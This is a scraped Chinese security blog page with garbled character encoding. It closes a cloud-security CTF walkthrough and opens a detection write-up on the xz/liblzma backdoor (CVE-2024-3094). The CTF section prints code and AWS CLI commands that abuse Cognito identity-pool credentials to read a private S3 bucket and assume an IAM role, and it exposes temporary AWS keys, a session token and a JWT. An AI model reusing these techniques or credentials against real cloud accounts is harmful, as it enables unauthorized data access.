class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;cognito-sync:*&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Sid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;VisualEditor1&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;s3:GetObject&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;s3:ListBucket&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;arn:aws:s3:::wiz-privatefiles&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;arn:aws:s3:::wiz-privatefiles/*&quot;</span></span><br><span class="line">            <span class="punctuation">]</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>å…è®¸æ‰§è¡Œ <code>mobileanalytics:PutEvents</code> å’Œ <code>cognito-sync:*</code> æ“ä½œã€‚</li>
<li>å…è®¸æ‰§è¡Œ <code>s3:GetObject</code> å’Œ <code>s3:ListBucket</code> æ“ä½œã€‚</li>
</ul>
<h4 id="1-2-ä½¿ç”¨F12å®šä½åˆ°cognito1-pngé™„è¿‘å‘ç°æ•æ„Ÿä»£ç "><a href="#1-2-ä½¿ç”¨F12å®šä½åˆ°cognito1-pngé™„è¿‘å‘ç°æ•æ„Ÿä»£ç " class="headerlink" title="1.2 ä½¿ç”¨F12å®šä½åˆ°cognito1.pngé™„è¿‘å‘ç°æ•æ„Ÿä»£ç "></a>1.2 ä½¿ç”¨F12å®šä½åˆ°cognito1.pngé™„è¿‘å‘ç°æ•æ„Ÿä»£ç </h4><p>è¿™æ®µä»£ç åœ¨å‰ç«¯ä½¿ç”¨äº†Cognitoèº«ä»½æ± å‡­æ®è·å–äº†s3å­˜å‚¨æ¡¶ä¸­çš„cognito1.pngå¹¶æ ¹æ®æ ‡ç­¾è¿”å›åˆ°å‰ç«¯ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªå‡­æ®è·å–å…¶ä»–å¯¹è±¡ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">  <span class="variable constant_">AWS</span>.<span class="property">config</span>.<span class="property">region</span> = <span class="string">&#x27;us-east-1&#x27;</span>;</span><br><span class="line">  <span class="variable constant_">AWS</span>.<span class="property">config</span>.<span class="property">credentials</span> = <span class="keyword">new</span> <span class="variable constant_">AWS</span>.<span class="title class_">CognitoIdentityCredentials</span>(&#123;<span class="title class_">IdentityPoolId</span>: <span class="string">&quot;us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b&quot;</span>&#125;);</span><br><span class="line">  <span class="comment">// Set the region</span></span><br><span class="line">  <span class="variable constant_">AWS</span>.<span class="property">config</span>.<span class="title function_">update</span>(&#123;<span class="attr">region</span>: <span class="string">&#x27;us-east-1&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line">  $(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> s3 = <span class="keyword">new</span> <span class="variable constant_">AWS</span>.<span class="title function_">S3</span>();</span><br><span class="line">    params = &#123;</span><br><span class="line">      <span class="title class_">Bucket</span>: <span class="string">&#x27;wiz-privatefiles&#x27;</span>,</span><br><span class="line">      <span class="title class_">Key</span>: <span class="string">&#x27;cognito1.png&#x27;</span>,</span><br><span class="line">      <span class="title class_">Expires</span>: <span class="number">60</span> * <span class="number">60</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    signedUrl = s3.<span class="title function_">getSignedUrl</span>(<span class="string">&#x27;getObject&#x27;</span>, params, <span class="keyword">function</span> (<span class="params">err, url</span>) &#123;</span><br><span class="line">      $(<span class="string">&#x27;#signedImg&#x27;</span>).<span class="title function_">attr</span>(<span class="string">&#x27;src&#x27;</span>, url);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å…ˆä½¿ç”¨listObjectsæ–¹æ³•ä»¥åŒæ ·çš„æ–¹å¼åˆ—ä¸¾s3å­˜å‚¨æ¡¶å¯¹è±¡</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">AWS</span>.<span class="property">config</span>.<span class="property">region</span> = <span class="string">&#x27;us-east-1&#x27;</span>;</span><br><span class="line"><span class="variable constant_">AWS</span>.<span class="property">config</span>.<span class="property">credentials</span> = <span class="keyword">new</span> <span class="variable constant_">AWS</span>.<span class="title class_">CognitoIdentityCredentials</span>(&#123;<span class="title class_">IdentityPoolId</span>: <span class="string">&quot;us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b&quot;</span>&#125;);</span><br><span class="line"><span class="comment">// Set the region</span></span><br><span class="line"><span class="variable constant_">AWS</span>.<span class="property">config</span>.<span class="title function_">update</span>(&#123;<span class="attr">region</span>: <span class="string">&#x27;us-east-1&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> s3 = <span class="keyword">new</span> <span class="variable constant_">AWS</span>.<span class="title function_">S3</span>();</span><br><span class="line">params = &#123;</span><br><span class="line">  <span class="title class_">Bucket</span>: <span class="string">&#x27;wiz-privatefiles&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">signedUrl = s3.<span class="title function_">getSignedUrl</span>(<span class="string">&#x27;listObjects&#x27;</span>, params, <span class="keyword">function</span> (<span class="params">err, url</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(url);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240402140002248.png" alt="image-20240402140002248"></p>
<p>è®¿é—®é“¾æ¥å¯æŸ¥çœ‹è¯¦ç»†å¯¹è±¡ä¿¡æ¯</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240402140117462.png" alt="image-20240402140117462"></p>
<p>åˆ©ç”¨getobjectæ–¹æ³•è·å–flag1.txtå†…å®¹</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">AWS</span>.<span class="property">config</span>.<span class="property">region</span> = <span class="string">&#x27;us-east-1&#x27;</span>;</span><br><span class="line"><span class="variable constant_">AWS</span>.<span class="property">config</span>.<span class="property">credentials</span> = <span class="keyword">new</span> <span class="variable constant_">AWS</span>.<span class="title class_">CognitoIdentityCredentials</span>(&#123;<span class="title class_">IdentityPoolId</span>: <span class="string">&quot;us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b&quot;</span>&#125;);</span><br><span class="line"><span class="comment">// Set the region</span></span><br><span class="line"><span class="variable constant_">AWS</span>.<span class="property">config</span>.<span class="title function_">update</span>(&#123;<span class="attr">region</span>: <span class="string">&#x27;us-east-1&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> s3 = <span class="keyword">new</span> <span class="variable constant_">AWS</span>.<span class="title function_">S3</span>();</span><br><span class="line">params = &#123;</span><br><span class="line">  <span class="title class_">Bucket</span>: <span class="string">&#x27;wiz-privatefiles&#x27;</span>,</span><br><span class="line">  <span class="title class_">Key</span>: <span class="string">&#x27;flag1.txt&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">signedUrl = s3.<span class="title function_">getSignedUrl</span>(<span class="string">&#x27;getObject&#x27;</span>, params, <span class="keyword">function</span> (<span class="params">err, url</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(url);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240402141142564.png" alt="image-20240402141142564"></p>
<p>è®¿é—®é“¾æ¥è·å–flag1.txtå†…å®¹</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240402141227400.png" alt="image-20240402141227400"></p>
<h2 id="6-ç¬¬å…­éƒ¨åˆ†"><a href="#6-ç¬¬å…­éƒ¨åˆ†" class="headerlink" title="6. ç¬¬å…­éƒ¨åˆ†"></a>6. ç¬¬å…­éƒ¨åˆ†</h2><h3 id="One-final-push-æœ€ç»ˆæ¨é€"><a href="#One-final-push-æœ€ç»ˆæ¨é€" class="headerlink" title="One final push  æœ€ç»ˆæ¨é€"></a>One final push  æœ€ç»ˆæ¨é€</h3><p>Anonymous access no more. Letâ€™s see what can you do now.</p>
<p>Now try it with the authenticated role: arn:aws:iam::092297851374:role&#x2F;Cognito_s3accessAuth_Role</p>
<h4 id="1-1-æˆ‘ä»¬æŸ¥çœ‹æ‹¥æœ‰çš„æƒé™-5"><a href="#1-1-æˆ‘ä»¬æŸ¥çœ‹æ‹¥æœ‰çš„æƒé™-5" class="headerlink" title="1.1 æˆ‘ä»¬æŸ¥çœ‹æ‹¥æœ‰çš„æƒé™"></a>1.1 æˆ‘ä»¬æŸ¥çœ‹æ‹¥æœ‰çš„æƒé™</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Principal&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;Federated&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cognito-identity.amazonaws.com&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sts:AssumeRoleWithWebIdentity&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Condition&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;StringEquals&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;cognito-identity.amazonaws.com:aud&quot;</span><span class="punctuation">:</span> <span class="string">&quot;us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>sts:AssumeRoleWithWebIdentity</code> æ˜¯ AWS Security Token Service (STS) ä¸­çš„ä¸€ç§æ“ä½œï¼Œç”¨äºé€šè¿‡ Web èº«ä»½éªŒè¯ï¼ˆå¦‚ OpenID Connect æˆ–è€… AWS Cognitoï¼‰è·å–è§’è‰²çš„ä¸´æ—¶å®‰å…¨å‡­è¯ã€‚è¿™ä¸ªæ“ä½œå…è®¸åŸºäºç»è¿‡èº«ä»½éªŒè¯çš„ Web ç”¨æˆ·èº«ä»½æ¥å‡å®šæŒ‡å®šçš„ IAM è§’è‰²ï¼Œå¹¶è·å–ä¸€ä¸ªä¸´æ—¶çš„å®‰å…¨å‡­è¯ï¼Œä»¥ä¾¿åœ¨ä¸€æ®µæ—¶é—´å†…è®¿é—® AWS èµ„æºã€‚</li>
<li>å¯ä»¥è·å–çš„ä¿¡æ¯è¿˜æœ‰æˆ‘ä»¬çš„èº«ä»½æ± åœ°å€ï¼šus-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b</li>
</ul>
<h4 id="1-2-æˆ‘ä»¬å°è¯•è¿›è¡Œstsèº«ä»½è®¤è¯è·å–å‡­è¯"><a href="#1-2-æˆ‘ä»¬å°è¯•è¿›è¡Œstsèº«ä»½è®¤è¯è·å–å‡­è¯" class="headerlink" title="1.2 æˆ‘ä»¬å°è¯•è¿›è¡Œstsèº«ä»½è®¤è¯è·å–å‡­è¯"></a>1.2 æˆ‘ä»¬å°è¯•è¿›è¡Œstsèº«ä»½è®¤è¯è·å–å‡­è¯</h4><p>å…ˆå°è¯•ä¸€ä¸‹è®¤è¯</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws sts assume-role-with-web-identity</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240402142645204.png" alt="image-20240402142645204"></p>
<p>å‘ç°éœ€è¦æä¾›ä¸‰ä¸ªå‚æ•°</p>
<ul>
<li><p>â€“role-arn arn:aws:iam::092297851374:role&#x2F;Cognito_s3accessAuth_Roleï¼ˆé¢˜ç›®å·²ç»™å‡ºï¼‰</p>
</li>
<li><p>â€“role-session-name</p>
<p>iam-finalï¼ˆä»»æ„å€¼ï¼‰</p>
</li>
<li><p>â€“web-identity-token</p>
<p>é€šè¿‡èº«ä»½æ± åœ°å€è¿›è¡Œè·å–èº«ä»½idï¼Œç„¶åè·å–tokenï¼Œå‰é¢çš„é¢˜ç›®ä¹Ÿæœ‰ç±»ä¼¼æ–¹æ³•</p>
</li>
</ul>
<h4 id="1-3-è·å–tokenå¹¶è¿›è¡Œstsè®¤è¯"><a href="#1-3-è·å–tokenå¹¶è¿›è¡Œstsè®¤è¯" class="headerlink" title="1.3 è·å–tokenå¹¶è¿›è¡Œstsè®¤è¯"></a>1.3 è·å–tokenå¹¶è¿›è¡Œstsè®¤è¯</h4><p>è·å–èº«ä»½id</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws cognito-identity get-id --identity-pool-id us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240402145024182.png" alt="image-20240402145024182"></p>
<p>è·å–token</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws cognito-identity get-open-id-token --identity-id us-east-1:157d6171-eebb-c389-cc99-2f1643910337</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240402145045191.png" alt="image-20240402145045191"></p>
<p>å°è¯•stsè®¤è¯è·å–å‡­æ®</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws sts assume-role-with-web-identity --role-arn arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role --role-session-name iam-final --web-identity-token eyJraWQiOiJ1cy1lYXN0LTE1IiwidHlwIjoiSldTIiwiYWxnIjoiUlM1MTIifQ.eyJzdWIiOiJ1cy1lYXN0LTE6MTU3ZDYxNzEtZWUxYy1jZjVmLTAxODItNDhmYjcxOTk3NDkyIiwiYXVkIjoidXMtZWFzdC0xOmI3M2NiMmQyLTBkMDAtNGU3Ny04ZTgwLWY5OWQ5YzEzZGEzYiIsImFtciI6WyJ1bmF1dGhlbnRpY2F0ZWQiXSwiaXNzIjoiaHR0cHM6Ly9jb2duaXRvLWlkZW50aXR5LmFtYXpvbmF3cy5jb20iLCJleHAiOjE3MTIwNDA5NDIsImlhdCI6MTcxMjA0MDM0Mn0.fvdf9FUyP_jX8FlAZmPecDP2b751Y8onuxM-oDttmiFhgfrEvmtTt2WMirYknUBcPyRbxvq65sHI8gVACaSBhdvXX-hFMsufHT-zvXuqknk-tw8iQbh5R6TiqIwALFw_XKI42MwtKEwM4_rIGuWi3NfUsvCTw2ozasNUH0yHVY4i7zoZrZjK6F8FouwkCISJXg3EpFaLLGbhGZvFWPo8zXve0e2b_jvov46je9s4Bcg9P1yizVZdxPoWit3hzIhZCqcCWucXQBcHQ92iV5utBDz8UuikdAI2WfInZyEOmnfI7tD9G2GUMtbVdZ9epnbbbxe9uOBLZtvSjW0vrIFqyg</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240402145111698.png" alt="image-20240402145111698"></p>
<p>è®¾ç½®æˆ‘ä»¬è·å–çš„å‡­æ®</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export AWS_ACCESS_KEY_ID=ASIARK7LBOHXBDE2Z6T7</span><br><span class="line">export AWS_SECRET_ACCESS_KEY=9nIvs6cieraSGqKTmcVKtnRam3GqSXH7rZkV2ZOm</span><br><span class="line">export AWS_SESSION_TOKEN=FwoGZXIvYXdzEEAaDNcSynI3yxJRduYP0iKhAp42je5FxsoJHQ7s0eicfTkA24WP3xjJpsFuPWnDsTyACa8auN1wUApThySmgsCy3H90LwBHWI92YuIxE3notWVtsyB6dzjzceHi8U29DWeqz8Odgr5HPJGujN5v6ehyEhVcRGRXtLgVT2nLFxavSfhoO9ko3+MUS6eEUJLvPNZaKE9V6PgEsq4D6vcfixJ773hiY8U8XWEDKZ/hKIT+1P2YkPo2aZzzTCb8A4JHWurVCr8AgxFqZq7qwag7lT3xQdutXC15k+8/rwkcaF3gvOvL/ysG2Oa6EJivzKFhOSw3FOL6agKM9jv8ZjgkTlnUOJ/8eROARctlVeNJst5ZjVTeT3sWNlkQkY+mCKLoBC/jYGOhZlxfjs4rRzBXvLbln/Yo5dSusAYylgGoiwogzTBbK8wOe8OUbtdTzGH+TSB81vclAhwfzDJQbW8K6Q5daFjPk2j9IImpZAODGNDLZGRZScGsuaCj/Y+S4h5hPrGmkIBkjWdGVlmXGG/VWoVk94e7s0wbQmWOwhk0HZkMwk6THHo7lkQdXmChLLg4TpHngf3f1phWMVS77irKza0osUjIMkTd44aAWTacYaV1hvE=</span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆæ“ä½œs3æ¡¶è·å–flag</p>
<p>{wiz:open-sesame-or-shell-i-say-openid}</p>
</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2024-04-02</span><i class="fa fa-tag"></i><a class="tag" href="/tags/å®¹å™¨å®‰å…¨/" title="å®¹å™¨å®‰å…¨">å®¹å™¨å®‰å…¨ </a><span class="leancloud_visitors"></span><span>About 2373 words, 7 min 54 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2024/03/31/CVE-2024-3094%20sshd-xz%E6%BC%8F%E6%B4%9E/">CVE-2024-3094 sshd-xzæ¼æ´</a></h3></div><div class="post-content"><div class="card"><p><p><a href="https://phoenixmerk.github.io/"><img src="https://img.shields.io/badge/%E4%BD%9C%E8%80%85-Phoenixmerk-blue.svg"></a></p>
<h2 id="æ¼æ´ç®€ä»‹"><a href="#æ¼æ´ç®€ä»‹" class="headerlink" title="æ¼æ´ç®€ä»‹"></a>æ¼æ´ç®€ä»‹</h2><p>xz æ˜¯ä¸€ç§é€šç”¨æ•°æ®å‹ç¼©æ ¼å¼ï¼Œå‡ ä¹å­˜åœ¨äºæ¯ä¸ª Linux å‘è¡Œç‰ˆä¸­ï¼ŒåŒ…æ‹¬ç¤¾åŒºé¡¹ç›®å’Œå•†ä¸šäº§å“å‘è¡Œç‰ˆã€‚ä»æœ¬è´¨ä¸Šè®²ï¼Œå®ƒæœ‰åŠ©äºå°†å¤§æ–‡ä»¶æ ¼å¼å‹ç¼©ï¼ˆç„¶åè§£å‹ç¼©ï¼‰ä¸ºæ›´å°ã€æ›´æ˜“äºç®¡ç†çš„å¤§å°ï¼Œä»¥ä¾¿é€šè¿‡æ–‡ä»¶ä¼ è¾“è¿›è¡Œå…±äº«ã€‚</p>
<p>2024å¹´3æœˆ29æ—¥ï¼Œæœ‰å¼€å‘äººå‘˜åœ¨Openwallå®‰å…¨é‚®ä»¶åˆ—è¡¨å‘å¸ƒå¸–å­ç§°liblzmaçš„ä»£ç å¯èƒ½è¢«ç¯¡æ”¹ï¼Œå¯èƒ½è¢«æ¤å…¥åé—¨ä»£ç ï¼Œè¯¥é—®é¢˜è®°å½•åœ¨CVE-2024-3094ä¸‹ ã€‚åœ¨XZ Utilsçš„5.6.0å’Œ5.6.1ç‰ˆæœ¬ä¸­ï¼Œä¸Šæ¸¸æºä»£ç å‹ç¼©åŒ…è¢«ç ´è§£ï¼Œå¹¶åœ¨æ„å»ºæ—¶å‘ç”Ÿæˆçš„ liblzma åº“ä¸­æ³¨å…¥æ¶æ„ä»£ç ï¼›å¯¼è‡´é€šè¿‡sshåè®®è¿œç¨‹è¿æ¥æ—¶ï¼Œopensshä¼šè°ƒç”¨ç›¸å…³æ¶æ„å‡½æ•°å¯¼è‡´ç ´åè®¤è¯ï¼Œä»è€Œè¾¾åˆ°æœªæˆæƒè®¿é—®åŠç™»é™†çš„å½±å“ã€‚</p>
<h2 id="å½±å“èŒƒå›´"><a href="#å½±å“èŒƒå›´" class="headerlink" title="å½±å“èŒƒå›´"></a>å½±å“èŒƒå›´</h2><p> xz, xz-utilsï¼š5.6.0ï¼Œ5.6.1 </p>
<p><strong>åˆ°ç›®å‰ï¼Œå¯èƒ½å—å½±å“çš„Linuxå‘è¡Œç‰ˆ</strong>ï¼š</p>
<ul>
<li>Fedora 41 and Fedora Rawhideï¼ˆå¼€å‘ç‰ˆï¼‰</li>
<li>Debian unstable (Sid)ï¼ˆä¸ç¨³å®šç‰ˆï¼‰</li>
<li>Debian testing, unstable experimentalå‘è¡Œç‰ˆ, ç‰ˆæœ¬ä»5.5.1alpha-0.1(uploaded on 2024-02-01), åˆ°5.6.1-1</li>
<li>Kali Linux 3æœˆ26æ—¥ï¼ˆåŒ…æ‹¬ï¼‰ä¹‹åæ›´æ–°çš„ç‰ˆæœ¬</li>
</ul>
<p><strong>åˆ°ç›®å‰ï¼Œæš‚ä¸å—å½±å“çš„Linuxå‘è¡Œç‰ˆï¼š</strong></p>
<ul>
<li>Red Hat Enterprise Linux (RHEL)</li>
<li>Debian æ‰€æœ‰ç¨³å®šç‰ˆ</li>
<li>SUSE å…¨éƒ¨ç‰ˆæœ¬</li>
<li>RedHat å…¨éƒ¨ç‰ˆæœ¬</li>
<li>Fedora 40ç‰ˆæœ¬</li>
</ul>
<h2 id="è¿è¡Œæ—¶æ£€æµ‹æ–¹å¼åˆ†æ"><a href="#è¿è¡Œæ—¶æ£€æµ‹æ–¹å¼åˆ†æ" class="headerlink" title="è¿è¡Œæ—¶æ£€æµ‹æ–¹å¼åˆ†æ"></a>è¿è¡Œæ—¶æ£€æµ‹æ–¹å¼åˆ†æ</h2><h3 id="1-å¼€å¯sshdçš„lzmaå‹ç¼©ä¼ è¾“"><a href="#1-å¼€å¯sshdçš„lzmaå‹ç¼©ä¼ è¾“" class="headerlink" title="1. å¼€å¯sshdçš„lzmaå‹ç¼©ä¼ è¾“"></a>1. å¼€å¯sshdçš„lzmaå‹ç¼©ä¼ è¾“</h3><p>ç¼–è¾‘ OpenSSH çš„é…ç½®æ–‡ä»¶ <code>/etc/ssh/sshd_config</code>ï¼Œåœ¨å…¶ä¸­æ·»åŠ æˆ–ä¿®æ”¹ä»¥ä¸‹è¡Œï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeCompression <span class="built_in">yes</span></span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240331172410544.png" alt="image-20240331172410544"></p>
<p>é‡å¯sshdç”Ÿæ•ˆ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart sshd</span><br></pre></td></tr></table></figure>

<h3 id="2-å°è¯•ä½¿ç”¨sshdè¿æ¥å…¶ä»–ä¸»æœº"><a href="#2-å°è¯•ä½¿ç”¨sshdè¿æ¥å…¶ä»–ä¸»æœº" class="headerlink" title="2. å°è¯•ä½¿ç”¨sshdè¿æ¥å…¶ä»–ä¸»æœº"></a>2. å°è¯•ä½¿ç”¨sshdè¿æ¥å…¶ä»–ä¸»æœº</h3><p>å°è¯•è¿æ¥ä¸»æœº</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh &#123;ç”¨æˆ·å&#125;@&#123;ä½ æƒ³è¿çš„IP&#125;</span><br></pre></td></tr></table></figure>

<p>å°è¯•æ‰§è¡Œå‘½ä»¤ï¼Œè¿™æ—¶å€™ä¼ è¾“çš„æ•°æ®ä¼šè¿›è¡Œå‹ç¼©</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span></span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240331172820960.png" alt="image-20240331172820960"></p>
<h3 id="3-è§‚å¯Ÿä¼ªæ–‡ä»¶ç›®å½•çš„æƒ…å†µ"><a href="#3-è§‚å¯Ÿä¼ªæ–‡ä»¶ç›®å½•çš„æƒ…å†µ" class="headerlink" title="3. è§‚å¯Ÿä¼ªæ–‡ä»¶ç›®å½•çš„æƒ…å†µ"></a>3. è§‚å¯Ÿä¼ªæ–‡ä»¶ç›®å½•çš„æƒ…å†µ</h3><p>æ­¤æ—¶sshdä¼šåŠ è½½é“¾æ¥åº“liblzmaï¼Œé¦–å…ˆæˆ‘ä»¬æ‰¾åˆ°sshdçš„è¿›ç¨‹å·ä¸º3759046</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ef|grep sshd</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240331173100122.png" alt="image-20240331173100122"></p>
<p>è¿›å…¥ä¼ªæ–‡ä»¶ç³»ç»ŸæŸ¥çœ‹mapsï¼Œå¯ä»¥å‘ç°è°ƒç”¨äº†åŠ¨æ€é“¾æ¥åº“liblzmaï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™é‡Œè¿›è¡Œæ­£åˆ™åŒ¹é…æ£€æµ‹æ˜¯å¦æ˜¯æ¼æ´åˆ©ç”¨</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /proc/3759046</span><br><span class="line"><span class="built_in">cat</span> maps|grep lzma</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240331173333349.png" alt="image-20240331173333349"></p>
